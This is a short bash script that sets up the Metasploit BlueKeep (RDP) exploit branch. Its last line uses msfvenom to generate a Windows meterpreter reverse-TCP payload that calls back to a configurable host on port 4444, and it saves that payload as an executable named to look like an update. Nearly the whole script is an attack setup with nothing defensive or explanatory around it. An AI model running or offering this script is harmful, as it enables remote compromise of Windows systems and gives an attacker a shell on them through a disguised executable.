#!/usr/bin/bash
cd /opt
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
git fetch origin pull/12283/head:bluekeep
git checkout bluekeep
gem install bundler && bundle
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -b "\x00" -f exe > UPDATEE101.exe
